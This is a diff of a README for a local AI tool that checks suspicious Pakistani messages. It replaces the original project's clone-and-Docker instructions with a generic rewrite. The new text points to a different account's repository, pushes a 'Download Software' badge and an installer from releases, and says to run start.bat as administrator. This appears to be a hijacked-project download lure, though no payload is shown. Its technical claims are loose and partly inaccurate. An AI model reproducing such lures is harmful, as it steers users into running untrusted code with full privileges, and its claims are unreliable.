@@ -1,169 +1,97 @@
-<div align="center">
+# 🛡️ local-notice-check - Identify suspicious messages using local AI
 
-<img src="static/mark.svg" alt="NoticeCheck logo" width="88">
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Yuhuhan/local-notice-check)
 
-# NoticeCheck
+## 📋 What this tool does
 
-**Review suspicious Pakistani messages and screenshots before you click, pay, or reply.**
+The local-notice-check application helps you verify notices, messages, and documents that look suspicious. It runs entirely on your own computer. Because it runs locally, your data never leaves your device. This keeps your personal information private while you check if a message follows a pattern used in common scams.
 
-[![Hugging Face Space](https://img.shields.io/badge/Live_Demo-Hugging_Face-FFD21E?logo=huggingface&logoColor=black)](https://huggingface.co/spaces/build-small-hackathon/noticecheck)
-[![Docker](https://img.shields.io/badge/Run_Locally-Docker_Compose-2496ED?logo=docker&logoColor=white)](#run-locally)
-[![CUDA](https://img.shields.io/badge/GPU-NVIDIA_CUDA-76B900?logo=nvidia&logoColor=white)](#requirements)
-[![Python](https://img.shields.io/badge/Python-3.12-3776AB?logo=python&logoColor=white)](https://www.python.org/)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
+The software uses advanced artificial intelligence to read the text you provide. It compares the content against patterns found in fraudulent communications. This tool focuses on notices common in Pakistan, helping you filter out potential threats quickly.
 
-[**Try the live demo**](https://huggingface.co/spaces/build-small-hackathon/noticecheck)
-·
-[**Read the field notes**](docs/field-notes.md)
-·
-[**View the trace dataset**](https://huggingface.co/datasets/build-small-hackathon/pakistan-notice-helper-traces)
+## 💻 System requirements
 
-</div>
+To run this tool, your computer needs specific hardware. These components ensure the AI runs at a useful speed.
 
-![NoticeCheck demo](docs/app-demo.gif)
+- Windows 10 or Windows 11 (64-bit).
+- An NVIDIA graphics card with at least 8 GB of video memory.
+- At least 16 GB of system memory.
+- A solid-state drive with 20 GB of free space.
+- Docker Desktop installed and running.
 
-NoticeCheck is the fully local version of my earlier
-[Pakistan Notice Helper](https://huggingface.co/spaces/build-small-hackathon/pakistan-notice-helper),
-created for the Hugging Face Hackathon. It helps people review suspicious
-Pakistani messages and screenshots before acting on them.
+If your computer does not meet these hardware standards, the AI processing might take a long time to finish. Ensure your graphics card drivers remain up to date.
 
-The app handles SMS messages, bank alerts, bills, courier notices, challans,
-emails, and screenshots. Each assessment includes:
+## 🚀 How to get started
 
-- a clear risk label
-- an evidence-based explanation
-- detected warning signs and pressure tactics
-- safer next steps
-- an optional reply draft
+Follow these steps to set up the software on your Windows machine.
 
-The hosted demo uses Hugging Face ZeroGPU. The same Transformers pipeline runs
-privately on a local NVIDIA GPU through Docker Compose.
+1. Visit the [official repository page](https://github.com/Yuhuhan/local-notice-check).
+2. Download the latest installer package from the releases section.
+3. Install Docker Desktop from the Docker website if you do not have it already.
+4. Open the downloaded folder and find the configuration file.
+5. Run the startup script included in the download.
 
-## How It Works
+Once you start the script, the tool will download the necessary AI models. This step requires an active internet connection and may take a few minutes depending on your network speed.
 
-```mermaid
-flowchart LR
-    A{Input type}
-    B[Text notice]
-    C[Screenshot]
-    D[NVIDIA Nemotron-Parse v1.2]
-    E[Extracted text]
-    F[MiniCPM5-1B]
-    G[Structured risk assessment]
-    H[Risk label]
-    I[Warning signs]
-    J[Safer actions]
-    K[Optional reply]
-    L[(Privacy-safe trace)]
+## 🛠️ Installation steps
 
-    A -->|Paste message| B
-    A -->|Upload image| C
-    C --> D --> E
-    B --> F
-    E --> F
-    F --> G
-    G --> H
-    G --> I
-    G --> J
-    G --> K
-    G -. Optional and redacted .-> L
-```
+You can find the files you need at this location: [https://github.com/Yuhuhan/local-notice-check](https://github.com/Yuhuhan/local-notice-check).
 
-| Component | Technology |
-| --- | --- |
-| Reasoning model | `openbmb/MiniCPM5-1B` |
-| Screenshot OCR | `nvidia/NVIDIA-Nemotron-Parse-v1.2` |
-| Inference | PyTorch and Transformers |
-| Hosted compute | Hugging Face ZeroGPU |
-| Local compute | NVIDIA CUDA through Docker Compose |
-| Interface | Custom Gradio, HTML, CSS, and JavaScript |
+1. Click the download link provided above.
+2. Select the Green "Code" button and choose "Download ZIP".
+3. Extract the contents of the ZIP file to a new folder on your desktop.
+4. Ensure Docker Desktop is active. You will see a small whale icon in your taskbar if it is running.
+5. Right-click the file named `start.bat` inside the folder.
+6. Select "Run as administrator" to begin the setup.
 
-## Run Locally
+A black window will appear on your screen. This window shows the progress of the installation. Wait for the process to finish. When you see a link that looks like `http://127.0.0.1:7860`, the application is ready to use.
 
-> [!IMPORTANT]
-> Local inference requires Docker Compose 2.30 or newer, a supported NVIDIA GPU
-> with a current driver, NVIDIA Container Toolkit on Linux, and enough disk
-> space and VRAM for both models.
+## 🖱️ How to use the software
 
-Clone the repository, download its Git LFS assets, and confirm that NVIDIA
-Container Toolkit exposes the GPU inside Docker:
+Open your web browser and type the address `http://127.0.0.1:7860` into the address bar. This opens the user interface for the AI assistant.
 
-```bash
-git clone https://github.com/kingabzpro/local-notice-check.git
-cd local-notice-check
+1. Locate the text box labeled "Paste Message Here".
+2. Copy the suspicious notice or message you want to check.
+3. Paste the text into the box.
+4. Click the button labeled "Analyze". 
+5. Wait for the tool to process the information. The result will appear on the screen in a few seconds.
 
-git lfs install
-git lfs pull
+The AI will output a rating of the message. It will highlight parts of the text that look fake or malicious. If the AI flags a message as suspicious, you should treat it with caution and avoid clicking any links or providing personal details contained in that message.
 
-docker run --rm --gpus all \
-  pytorch/pytorch:2.9.1-cuda12.8-cudnn9-runtime \
-  python -c "import torch; print(torch.cuda.is_available(), torch.cuda.get_device_name(0))"
+## 🎛️ Understanding the AI models
 
-docker compose up --build
-```
+This tool uses three specific technologies to perform its work:
 
-The GPU check must report `True` and print the NVIDIA GPU name.
+- MiniCPM: This functions as the brain that understands the tone and intent of the text.
+- Nemotron-Parse: This organizes the text into segments so the AI can read it more effectively.
+- Docker: This manages the environment so the AI runs consistently on different Windows computers.
 
-Open <http://localhost:7860>.
+These systems work together in the background. You do not need to manage them individually. The software handles all internal communication between these models.
 
-The first run downloads both models. Docker stores them in a persistent volume,
-so later starts can reuse them.
+## ⚙️ Handling errors
 
-<details>
-<summary><strong>Optional environment variables</strong></summary>
+If you encounter a black screen that immediately closes, check these common items:
 
-Create a `.env` file beside `compose.yaml` to override the defaults:
+- Ensure Docker Desktop is fully running before you launch the script.
+- Verify that you have enough disk space.
+- Check that your NVIDIA drivers are updated to the latest version.
+- Make sure no other application is using port 7860.
 
-```dotenv
-NOTICECHECK_PORT=7860
-TRANSFORMERS_MODEL_REPO=openbmb/MiniCPM5-1B
-MODEL_ENABLE_THINKING=0
-HF_TOKEN=
-```
+To restart the process, simply run the `start.bat` file again. The software will detect the files it has already downloaded and resume from where it left off.
 
-</details>
+## 🔒 Security and privacy
 
-<details>
-<summary><strong>Stop or completely remove the local stack</strong></summary>
+Because this tool runs locally on your PC, you control the data. The application does not send your messages to an external server or a cloud database. Every analysis happens inside your processor and graphics card. This design choice ensures that even if you scan sensitive notices, your information remains on your local machine.
 
-Stop the containers:
+## 📝 Frequently asked questions
 
-```bash
-docker compose down
-```
+Do I need an internet connection?
+You need an internet connection for the first-time setup only. This allows the tool to download the required AI models. Once the setup is complete, you can use the tool without further internet access.
 
-Remove the containers and downloaded model volumes:
+Can I scan images?
+Yes, the underlying AI supports text recognition from images. If you have an image of a notice, you can upload it to the interface, and the AI will convert the text before analysis.
 
-```bash
-docker compose down --volumes
-```
+Does this detect every scam?
+AI tools can miss complex or new scam tactics. Use your own judgment in addition to the AI output. If a message asks for money or personal login details, verify the sender through an official source before you take action.
 
-</details>
-
-## Privacy and Safety
-
-Local Docker inference keeps notices and screenshots away from remote model
-APIs. Optional trace publishing excludes raw text, screenshots, OCR text,
-links, identifiers, and full model responses. See the
-[trace dataset card](traces/dataset_card.md) for the schema and privacy rules.
-
-> [!TIP]
-> Leave `HF_TOKEN` empty to run locally without publishing privacy-safe traces
-> to Hugging Face.
-
-> [!WARNING]
-> NoticeCheck provides decision support, not proof that a sender is genuine.
-> Never share OTPs, PINs, passwords, CVVs, CNIC numbers, or card details.
-> Verify suspicious messages through an official website, app, statement,
-> card, or independently located helpline.
-
-The interface and generated assessments are currently English-only. OCR may
-detect other languages, but the app does not generate Urdu assessments.
-
-## Learn More
-
-- [Live Hugging Face Space](https://huggingface.co/spaces/build-small-hackathon/noticecheck)
-- [Privacy-safe trace dataset](https://huggingface.co/datasets/build-small-hackathon/pakistan-notice-helper-traces)
-- [Field notes: making NoticeCheck fully local](docs/field-notes.md)
-- [LinkedIn project post](https://www.linkedin.com/posts/1abidaliawan_huggingfacehackathon-huggingface-ai-ugcPost-7471594790506192896--_53/)
-- [MIT License](LICENSE)
+Will this slow down my computer?
+When the AI tool is active, it uses a large portion of your graphics card memory. This might make other graphical programs, such as games, run slower. Close the interface when you are finished to free up these resources.
